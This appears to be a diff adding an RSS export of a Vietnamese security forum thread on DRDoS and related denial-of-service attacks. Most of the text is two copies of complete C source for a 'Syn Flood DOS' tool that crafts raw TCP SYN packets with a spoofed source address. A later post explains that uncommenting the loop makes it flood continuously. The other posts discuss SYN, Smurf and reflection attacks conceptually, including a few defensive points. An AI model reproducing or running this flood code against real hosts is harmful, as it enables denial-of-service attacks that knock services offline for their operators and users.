+	int s = socket &#40;PF_INET, SOCK_RAW, IPPROTO_TCP&#41;;
+	//Datagram to represent the packet
+	char datagram&#91;4096&#93;;
+	//IP header
+	struct iphdr *iph = &#40;struct iphdr *&#41; datagram;
+	//TCP header
+	struct tcphdr *tcph = &#40;struct tcphdr *&#41; &#40;datagram + sizeof &#40;struct ip&#41;&#41;;
+	struct sockaddr_in sin;
+	struct pseudo_header psh;
+
+	sin.sin_family = AF_INET;
+	sin.sin_port = htons&#40;80&#41;;
+	sin.sin_addr.s_addr = inet_addr &#40;&quot;1.2.3.4&quot;&#41;;
+
+	memset &#40;datagram, 0, 4096&#41;;	/* zero out the buffer */
+
+	//Fill in the IP Header
+	iph-&gt;ihl = 5;
+	iph-&gt;version = 4;
+	iph-&gt;tos = 0;
+	iph-&gt;tot_len = sizeof &#40;struct ip&#41; + sizeof &#40;struct tcphdr&#41;;
+	iph-&gt;id = htonl &#40;54321&#41;;	//Id of this packet
+	iph-&gt;frag_off = 0;
+	iph-&gt;ttl = 255;
+	iph-&gt;protocol = IPPROTO_TCP;
+	iph-&gt;check = 0;		//Set to 0 before calculating checksum
+	iph-&gt;saddr = inet_addr &#40;&quot;192.168.1.2&quot;&#41;;	//Spoof the source ip address
+	iph-&gt;daddr = sin.sin_addr.s_addr;
+
+	iph-&gt;check = csum &#40;&#40;unsigned short *&#41; datagram, iph-&gt;tot_len &gt;&gt; 1&#41;;
+
+	//TCP Header
+	tcph-&gt;source = htons &#40;1234&#41;;
+	tcph-&gt;dest = htons &#40;80&#41;;
+	tcph-&gt;seq = 0;
+	tcph-&gt;ack_seq = 0;
+	tcph-&gt;doff = 5;		/* first and only tcp segment */
+	tcph-&gt;fin=0;
+	tcph-&gt;syn=1;
+	tcph-&gt;rst=0;
+	tcph-&gt;psh=0;
+	tcph-&gt;ack=0;
+	tcph-&gt;urg=0;
+	tcph-&gt;window = htons &#40;5840&#41;;	/* maximum allowed window size */
+	tcph-&gt;check = 0;/* if you set a checksum to zero, your kernel's IP stack
+				should fill in the correct checksum during transmission */
+	tcph-&gt;urg_ptr = 0;
+	//Now the IP checksum
+
+	psh.source_address = inet_addr&#40;&quot;192.168.1.2&quot;&#41;;
+	psh.dest_address = sin.sin_addr.s_addr;
+	psh.placeholder = 0;
+	psh.protocol = IPPROTO_TCP;
+	psh.tcp_length = htons&#40;20&#41;;
+
+	memcpy&#40;&psh.tcp , tcph , sizeof &#40;struct tcphdr&#41;&#41;;
+
+	tcph-&gt;check = csum&#40; &#40;unsigned short*&#41; &psh , sizeof &#40;struct pseudo_header&#41;&#41;;
+
+	//IP_HDRINCL to tell the kernel that headers are included in the packet
+	{
+		int one = 1;
+		const int *val = &one;
+		if &#40;setsockopt &#40;s, IPPROTO_IP, IP_HDRINCL, val, sizeof &#40;one&#41;&#41; &lt; 0&#41;
+			printf &#40;&quot;Warning: Cannot set HDRINCL!n&quot;&#41;;
+	}
+
+	//while &#40;1&#41;
+	//{
+		//Send the packet
+		if &#40;sendto &#40;s,		/* our socket */
+					datagram,	/* the buffer containing headers and data */
+					iph-&gt;tot_len,	/* total length of our datagram */
+					0,		/* routing flags, normally always 0 */
+					&#40;struct sockaddr *&#41; &sin,	/* socket addr, just like in */
+					sizeof &#40;sin&#41;&#41; &lt; 0&#41;		/* a normal send&#40;&#41; */
+
+			printf &#40;&quot;errorn&quot;&#41;;
+		//Data send successfully
+		else
+			printf &#40;&quot;.&quot;&#41;;
+	//}
+
+	return 0;
+}</pre>
+		</div>]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/156.hva#208843</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/156.hva#208843</link>
+				<pubDate><![CDATA[Sun, 11 Apr 2010 01:42:11]]> GMT</pubDate>
+				<author><![CDATA[ anpha]]></author>
+			</item>
+			<item>
+				<title>DRDoS</title>
+				<description><![CDATA[ nếu mà tìm được sách thì đã không phải ngồi hỏi như thế này mất thời gian  B-) B-) B-) B-)]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/156.hva#208851</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/156.hva#208851</link>
+				<pubDate><![CDATA[Mon, 12 Apr 2010 05:30:58]]> GMT</pubDate>
+				<author><![CDATA[ graycap]]></author>
+			</item>
+			<item>
+				<title>DRDoS</title>
+				<description><![CDATA[ <p></p>
+		<cite class="blockquote">graycap wrote:</cite><br>
+		<blockquote>nếu mà tìm được sách thì đã không phải ngồi hỏi như thế này mất thời gian  B-) B-) B-) B-)&nbsp;
+		</blockquote>
+Sự thiếu(hoặc có khi chẳng biết) về TCP/IP cộng với các kiến thức lập trình và cấu trúc hệ thống thông tin dẫn tới chuyện chẳng biết đọc cái gì cũng như chẳng biết kiếm cái gì để đọc. Thực tế nó vậy, đừng có than làm gì cho mệt.   B-) ]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/156.hva#208854</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/156.hva#208854</link>
+				<pubDate><![CDATA[Mon, 12 Apr 2010 05:36:25]]> GMT</pubDate>
+				<author><![CDATA[ tmd]]></author>
+			</item>
+			<item>
+				<title>DRDoS</title>
+				<description><![CDATA[ Chào các bro.
+các bro mạn phép cho em hỏi. trong quá trình tấn công SYN thì theo như em nghĩ là nó chỉ là sự kết hợp giữa quá trình bắt tay 3 bước trong phiên TCP/IP. 1 máy chủ tấn công 1 victim thì mình nên liệt vào cho hắn là D-Dos hoặc Dos thôi chứ nếu liệt vào DrDos thì có hơi quá ko? 
+hơn nữa nếu SYN đc liệt vào 1 trong những hình thức tấn công DrDos thì kiểu tấn công Smurf Attack  thì thế nào? em nhận thấy kiểu tấn công này còn mạnh hơn cả SYN vì nó phát gói tin cho tất cả các máy cùng trả lời 1 lúc. 
+Các bro thông cảm cho những câu hỏi gà của em ở trên.. :D rất mong các bro giúp đỡ. thank]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/156.hva#226799</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/156.hva#226799</link>
+				<pubDate><![CDATA[Fri, 10 Dec 2010 03:24:36]]> GMT</pubDate>
+				<author><![CDATA[ congthang_9x]]></author>
+			</item>
+			<item>
+				<title>DRDoS</title>
+				<description><![CDATA[ <p></p>
+		<cite class="blockquote">congthang_9x wrote:</cite><br>
+		<blockquote>Chào các bro.
+các bro mạn phép cho em hỏi. trong quá trình <font color='red'>tấn công SYN</font> thì theo như em nghĩ là nó chỉ là sự kết hợp giữa quá trình bắt tay 3 bước trong phiên TCP/IP. 1 máy chủ tấn công 1 victim thì mình nên liệt vào cho hắn là D-Dos hoặc Dos thôi chứ nếu<font color='red'> liệt vào DrDos thì có hơi quá ko?</font> 
+hơn nữa nếu <font color='red'>SYN đc liệt vào 1 trong những hình thức tấn công DrDos</font> thì kiểu tấn công <font color='orange'>Smurf Attack  thì thế nào?</font> em nhận thấy kiểu tấn công này còn mạnh hơn cả SYN vì nó phát gói tin cho tất cả các máy cùng trả lời 1 lúc. 
+Các bro thông cảm cho những câu hỏi gà của em ở trên.. :D rất mong các bro giúp đỡ. thank&nbsp;
+		</blockquote>
+
+<font color='red'>==&gt;</font> Bạn đọc kỹ lại bài viết của anh Mulan để hiểu rõ hơn. SYN attack là một kỹ thuật dùng trong tấn công DOS/DDOS
+
+<font color='orange'>==&gt; </font> Smuff attack cũng là một hình thức tấn công DDOS dùng gói tin ICMP, muốn cuộc tấn công hiệu quả thì đòi hỏi &quot;mạng khuếch đại&quot; đủ lớn. Tuy nhiên nếu các router trên mạng tắt chức năng Directed Broadcast thì dạng tấn công này không hiệu quả, chưa kể các firewall thường chặn các gói tin ICMP. Vì thế hình thức tấn công này không còn phổ biến. 
+
+- Ky0 -
+
+]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/156.hva#226808</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/156.hva#226808</link>
+				<pubDate><![CDATA[Fri, 10 Dec 2010 06:11:50]]> GMT</pubDate>
+				<author><![CDATA[ Ky0]]></author>
+			</item>
+			<item>
+				<title>DRDoS</title>
+				<description><![CDATA[ Một là các đồng chí không nên đào mồ topic.
+Hai là các vấn đề này nên đọc kỹ và hiểu về TCP/IP, thì sẽ không có gì thắc mắc nhiều.
+Ba là tớ nhầm DrDOS, tưởng là Doctor DOS (Disk Operating System), tên của 1 hệ điều hành cũ, nên click vào, và vào thì cũng nên reply lăng nhăng 1 tí.]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/156.hva#226868</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/156.hva#226868</link>
+				<pubDate><![CDATA[Sat, 11 Dec 2010 03:54:16]]> GMT</pubDate>
+				<author><![CDATA[ myquartz]]></author>
+			</item>
+			<item>
+				<title>DRDoS</title>
+				<description><![CDATA[ <p></p>
+		<cite class="blockquote">Ky0 wrote:</cite><br>
+		<blockquote>
+
+<font color='red'>==&gt;</font> Bạn đọc kỹ lại bài viết của anh Mulan để hiểu rõ hơn. SYN attack là một kỹ thuật dùng trong tấn công DOS/DDOS
+
+<font color='orange'>==&gt; </font> Smuff attack cũng là một hình thức tấn công DDOS dùng gói tin ICMP, muốn cuộc tấn công hiệu quả thì đòi hỏi &quot;mạng khuếch đại&quot; đủ lớn. Tuy nhiên nếu các router trên mạng tắt chức năng Directed Broadcast thì dạng tấn công này không hiệu quả, chưa kể các firewall thường chặn các gói tin ICMP. Vì thế hình thức tấn công này không còn phổ biến. 
+
+- Ky0 -
+
+&nbsp;
+		</blockquote>
+
+Cảm ơn bác Kyo. nhưng bác cho em hỏi thêm 1 câu nữa là trong tấn công drdos thì em thấy kiểu tấn công đó rất giống với Smuff attack ở trên.
+<br>
+			<div align="center" class="limitview"><img src='http://ca7.upanh.com/17.722.22112447.oDS0/1.jpg' border="0" onload="maxImg(this, 500px);" /></div>
+
+Vậy bác cho em hỏi là giữa 2 cái này cách thức nó khác nhau như thế nào? em thấy cả 2 cái đều gửi gói tin ICMP cả mà. mong bác giải thick giùm em.
+chân thành cảm ơn]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/156.hva#226925</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/156.hva#226925</link>
+				<pubDate><![CDATA[Sun, 12 Dec 2010 03:47:04]]> GMT</pubDate>
+				<author><![CDATA[ congthang_9x]]></author>
+			</item>
+			<item>
+				<title>DRDoS</title>
+				<description><![CDATA[ <p></p>
+		<cite class="blockquote">congthang_9x wrote:</cite><br>
+		<blockquote>Vậy bác cho em hỏi là giữa 2 cái này cách thức nó khác nhau như thế nào? em thấy cả 2 cái đều gửi gói tin ICMP cả mà. mong bác giải thick giùm em.
+chân thành cảm ơn&nbsp;
+		</blockquote>
+
+Việc DDoS đâu nhất thiết phải dùng gói tin ICMP, ICMP chỉ là 1 dạng gói tin "đặc biệt" sử dụng trong truyền tải mạng thôi
+
+Em tìm hiểu thêm về 3-way Handshake TCP để hiểu hơn về DRDoS em nhé :)
+
+ví dụ:<span class="link"> http://www.inetdaemon.com/tutorials/internet/tcp/3-way_handshake.shtml</span>
+
+còn muốn một tài liệu tiếng Việt thì em ráng lục trong HVA cũng có vài chủ đề thảo luận rất sâu về vấn đề này ]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/156.hva#226926</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/156.hva#226926</link>
+				<pubDate><![CDATA[Sun, 12 Dec 2010 05:20:26]]> GMT</pubDate>
+				<author><![CDATA[ xnohat]]></author>
+			</item>
+			<item>
+				<title>DRDoS</title>
+				<description><![CDATA[ <p></p>
+		<cite class="blockquote">anpha wrote:</cite><br>
+		<blockquote>Em post nhầm code. Cái này cơ, xin lỗi vì chức năng sửa bài không hoặt động cho members
+<span class="quotetxt"><b>Code:</b></span><br/>
+		<div class="coded"">
+		<pre>/*
+	Syn Flood DOS with LINUX sockets
+*/
+#include&lt;stdio.h&gt;
+#include&lt;netinet/tcp.h&gt;	//Provides declarations for tcp header
+#include&lt;netinet/ip.h&gt;	//Provides declarations for ip header
+
+typedef struct pseudo_header    //needed for checksum calculation
+{
+	unsigned int source_address;
+	unsigned int dest_address;
+	unsigned char placeholder;
+	unsigned char protocol;
+	unsigned short tcp_length;
+	//char tcp&#91;28&#93;;
+	struct tcphdr tcp;
+};
+
+unsigned short csum&#40;unsigned short *ptr,int nbytes&#41; {
+	register long sum;
+	unsigned short oddbyte;
+	register short answer;
+
+	sum=0;
+	while&#40;nbytes&gt;1&#41; {
+		sum+=*ptr++;
+		nbytes-=2;
+	}
+	if&#40;nbytes==1&#41; {
+		oddbyte=0;
+		*&#40;&#40;u_char*&#41;&oddbyte&#41;=*&#40;u_char*&#41;ptr;
+		sum+=oddbyte;
+	}
+
+	sum = &#40;sum&gt;&gt;16&#41;+&#40;sum & 0xffff&#41;;
+	sum = sum + &#40;sum&gt;&gt;16&#41;;
+	answer=&#40;short&#41;~sum;
+
+	return&#40;answer&#41;;
+}
+
+int main &#40;void&#41;
+{
+	//Create a raw socket
+	int s = socket &#40;PF_INET, SOCK_RAW, IPPROTO_TCP&#41;;
+	//Datagram to represent the packet
+	char datagram&#91;4096&#93;;
+	//IP header
+	struct iphdr *iph = &#40;struct iphdr *&#41; datagram;
+	//TCP header
+	struct tcphdr *tcph = &#40;struct tcphdr *&#41; &#40;datagram + sizeof &#40;struct ip&#41;&#41;;
+	struct sockaddr_in sin;
+	struct pseudo_header psh;
+
+	sin.sin_family = AF_INET;
+	sin.sin_port = htons&#40;80&#41;;
+	sin.sin_addr.s_addr = inet_addr &#40;&quot;1.2.3.4&quot;&#41;;
+
+	memset &#40;datagram, 0, 4096&#41;;	/* zero out the buffer */
+
+	//Fill in the IP Header
+	iph-&gt;ihl = 5;
+	iph-&gt;version = 4;
+	iph-&gt;tos = 0;
+	iph-&gt;tot_len = sizeof &#40;struct ip&#41; + sizeof &#40;struct tcphdr&#41;;
+	iph-&gt;id = htonl &#40;54321&#41;;	//Id of this packet
+	iph-&gt;frag_off = 0;
+	iph-&gt;ttl = 255;
+	iph-&gt;protocol = IPPROTO_TCP;
+	iph-&gt;check = 0;		//Set to 0 before calculating checksum
+	iph-&gt;saddr = inet_addr &#40;&quot;192.168.1.2&quot;&#41;;	//Spoof the source ip address
+	iph-&gt;daddr = sin.sin_addr.s_addr;
+
+	iph-&gt;check = csum &#40;&#40;unsigned short *&#41; datagram, iph-&gt;tot_len &gt;&gt; 1&#41;;
+
+	//TCP Header
+	tcph-&gt;source = htons &#40;1234&#41;;
+	tcph-&gt;dest = htons &#40;80&#41;;
+	tcph-&gt;seq = 0;
+	tcph-&gt;ack_seq = 0;
+	tcph-&gt;doff = 5;		/* first and only tcp segment */
+	tcph-&gt;fin=0;
+	tcph-&gt;syn=1;
+	tcph-&gt;rst=0;
+	tcph-&gt;psh=0;
+	tcph-&gt;ack=0;
+	tcph-&gt;urg=0;
+	tcph-&gt;window = htons &#40;5840&#41;;	/* maximum allowed window size */
+	tcph-&gt;check = 0;/* if you set a checksum to zero, your kernel's IP stack
+				should fill in the correct checksum during transmission */
+	tcph-&gt;urg_ptr = 0;
+	//Now the IP checksum
+
+	psh.source_address = inet_addr&#40;&quot;192.168.1.2&quot;&#41;;
+	psh.dest_address = sin.sin_addr.s_addr;
+	psh.placeholder = 0;
+	psh.protocol = IPPROTO_TCP;
+	psh.tcp_length = htons&#40;20&#41;;
+
+	memcpy&#40;&psh.tcp , tcph , sizeof &#40;struct tcphdr&#41;&#41;;
+
+	tcph-&gt;check = csum&#40; &#40;unsigned short*&#41; &psh , sizeof &#40;struct pseudo_header&#41;&#41;;
+
+	//IP_HDRINCL to tell the kernel that headers are included in the packet
+	{
+		int one = 1;
+		const int *val = &one;
+		if &#40;setsockopt &#40;s, IPPROTO_IP, IP_HDRINCL, val, sizeof &#40;one&#41;&#41; &lt; 0&#41;
+			printf &#40;&quot;Warning: Cannot set HDRINCL!n&quot;&#41;;
+	}
+
+	//while &#40;1&#41;
+	//{
+		//Send the packet
+		if &#40;sendto &#40;s,		/* our socket */
+					datagram,	/* the buffer containing headers and data */
+					iph-&gt;tot_len,	/* total length of our datagram */
+					0,		/* routing flags, normally always 0 */
+					&#40;struct sockaddr *&#41; &sin,	/* socket addr, just like in */
+					sizeof &#40;sin&#41;&#41; &lt; 0&#41;		/* a normal send&#40;&#41; */
+
+			printf &#40;&quot;errorn&quot;&#41;;
+		//Data send successfully
+		else
+			printf &#40;&quot;.&quot;&#41;;
+	//}
+
+	return 0;
+}</pre>
+		</div>&nbsp;
+		</blockquote>
+
+
+nếu mình ko nhầm thì cái code này bạn lấy ở site binarytides.com 
+link day  <font color='orange'>http://www.binarytides.com/blog/syn-flood-dos-attack/ </font>
+cái này sẽ send một SYN packet đến server nào đó với invalid source IP , xài raw socket để tạo ra packet .
+khi uncomment vòng lặp while thì nó sẽ send packet liên tục hay còn gọi là flood đó 
+xài wireshark capture thấy cũng flood điên cuồng lắm nhưng ko biết bên server thế nào , mình nghĩ cái này để học thôi chứ chắc ko flood đc ai đâu :D]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/156.hva#253580</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/156.hva#253580</link>
+				<pubDate><![CDATA[Mon, 13 Feb 2012 08:15:36]]> GMT</pubDate>
+				<author><![CDATA[ nguyenga86]]></author>
+			</item>
+	</channel>
+</rss>
